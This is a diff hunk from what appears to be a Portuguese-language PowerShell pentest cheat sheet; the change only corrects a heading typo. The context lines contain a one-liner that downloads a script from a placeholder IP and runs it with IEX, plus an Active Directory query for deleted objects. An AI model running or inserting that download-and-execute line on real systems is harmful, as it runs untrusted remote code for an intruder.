@@ -7,7 +7,7 @@
 (new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
 ```
 
-## Obter arquivo a lixeira
+## Obter arquivo da lixeira
 ```powershell
 Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
 ```
